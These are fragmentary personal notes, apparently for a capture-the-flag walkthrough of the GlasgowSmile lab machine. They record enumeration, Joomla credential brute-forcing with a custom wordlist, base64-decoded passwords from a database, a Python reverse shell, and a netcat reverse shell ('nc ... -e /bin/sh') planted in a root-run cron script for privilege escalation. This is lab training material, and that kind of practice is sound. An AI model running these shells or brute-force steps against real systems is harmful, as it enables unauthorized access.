参考资料  
[https://www.hackingarticles.in/glasgow-smile-1-1-vulnhub-walkthrough/](https://www.hackingarticles.in/glasgow-smile-1-1-vulnhub-walkthrough/)
    
nmap -sC -sV -p- -oN enum/nmap_quick.txt 192.168.146.79 --open
    
joomscan -u [http://192.168.146.79/joomla/](http://192.168.146.79/joomla/)
       
┌──(kali㉿kali)-[~/Desktop/pg02/GlasgowSmile]  
└─$ ssh rob@192.168.146.79  
The authenticity of host '192.168.146.79 (192.168.146.79)' can't be established.  
ED25519 key fingerprint is SHA256:bVGopxZOACv+Dy/jm+EmAyAQm+YSDTmVK1pVrNUz+P8.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '192.168.146.79' (ED25519) to the list of known hosts.  
rob@192.168.146.79's password:  
Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
 
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.
 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
rob@glasgowsmile:~$ ls  
Abnerineedyourhelp howtoberoot local.txt user.txt  
rob@glasgowsmile:~$ cat local.txt  
b6d6e4baef8202bd3280983e1a251781  
rob@glasgowsmile:~$
      

Username:joomla  
Password:Gotham
      

I33hm0e9:my0death000makes45mm2e8cens00than0my0life0
 
I33hm0e9:my0death000makes45mm2e8cens00than0my0life0
 
I33hope99my0death000makes44more8cents00than0my0life0
   

Username:penguins  
Password:scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
      

python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.235",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
         

username: joomla  
password: Gotham
   

cewl -d 0 -m 5 [https://en.wikipedia.org/wiki/Joker_\(2019_film\)](https://en.wikipedia.org/wiki/Joker_\\(2019_film\\)) -w joker-wordlist.txt
    
nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=joker-wordlist.txt,http-joomla-brute.threads=3,http-joomla-brute.uri=/joomla/administrator/index.php,brute.firstonly=true' 192.168.120.79
   

fangwen  
curl -s [http://192.168.120.79/joomla/templates/protostar/error.php](http://192.168.120.79/joomla/templates/protostar/error.php)
    
diyige  
deeaabe7daf21d0b3b4e1ccfb59590be
       
┌──(kali㉿kali)-[~/Desktop/pg02/GlasgowSmile]  
└─$ nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=joker-wordlist.txt,http-joomla-brute.threads=3,http-joomla-brute.uri=/joomla/administrator/index.php,brute.firstonly=true' 192.168.120.79  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-08 23:23 EST  
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 5.93% done; ETC: 23:24 (0:00:32 remaining)  
Nmap scan report for 192.168.120.79  
Host is up (0.084s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
80/tcp open http Apache httpd 2.4.38 ((Debian))  
|_http-server-header: Apache/2.4.38 (Debian)  
|_http-joomla-brute: Invalid usernames iterator: Error parsing username list: users.txt: No such file or directory  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 17.55 seconds   ┌──(kali㉿kali)-[~/Desktop/pg02/GlasgowSmile]  
└─$
      

+----+---------+------------+---------+----------------------------------------------+  
| id | type | date | name | pswd |  
+----+---------+------------+---------+----------------------------------------------+  
| 1 | Soldier | 2020-06-14 | Bane | YmFuZWlzaGVyZQ== |  
| 2 | Soldier | 2020-06-14 | Aaron | YWFyb25pc2hlcmU= |  
| 3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ== |  
| 4 | Soldier | 2020-06-14 | buster | YnVzdGVyaXNoZXJlZmY= |  
| 6 | Soldier | 2020-06-14 | rob | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |  
| 7 | Soldier | 2020-06-14 | aunt | YXVudGlzIHRoZSBmdWNrIGhlcmU= |  
+----+---------+------------+---------+----------------------------------------------+
 
Bane YmFuZWlzaGVyZQ==  
Aaron YWFyb25pc2hlcmU=  
Carnage Y2FybmFnZWlzaGVyZQ==  
rob Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/  
aunt YXVudGlzIHRoZSBmdWNrIGhlcmU=
 
???AllIHaveAreNegativeThoughts???
    
base64 jiema
 
rob:???AllIHaveAreNegativeThoughts???
   

fanyizhihou  
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."  
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
      

STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
   

abner:I33hope99my0death000makes44more8cents00than0my0life0
       
I33hope99my0death000makes44more8cents00than0my0life0
   

I33hope99my0death000makes44more8cents00than0my0life0
   

[https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)
    
/home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
      

scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
          
abner@glasgowsmile:~$ su - penguin  
Password:  
penguin@glasgowsmile:~$ ls  
SomeoneWhoHidesBehindAMask  
penguin@glasgowsmile:~$  
penguin@glasgowsmile:~$  
penguin@glasgowsmile:~$  
penguin@glasgowsmile:~$  
penguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask/  
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls  
find PeopleAreStartingToNotice.txt user3.txt  
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -al  
total 332  
drwxr--r-- 2 penguin penguin 4096 Jun 16 2020 .  
drwxr-xr-x 4 penguin penguin 4096 Aug 25 2020 ..  
-rwSr----- 1 penguin penguin 315904 Jun 15 2020 find  
-rw-r----- 1 penguin root 1457 Jun 15 2020 PeopleAreStartingToNotice.txt  
-rwxr-xr-x 1 penguin root 612 Jun 16 2020 .trash_old  
-rw-r----- 1 penguin penguin 32 Aug 25 2020 user3.txt  
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cp .trash_old .trash_old.bkp  
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ echo "nc 192.168.45.196 4444 -e /bin/sh" \> .trash_old  
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls  
find PeopleAreStartingToNotice.txt user3.txt  
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old  
nc 192.168.45.196 4444 -e /bin/sh  
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$
 
192.168.212.79
   

su penguin:scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
    
fanyi  
[https://medium.com/@danielndias/pg-play-glasgowsmile-346fb5ef18df](https://medium.com/@danielndias/pg-play-glasgowsmile-346fb5ef18df)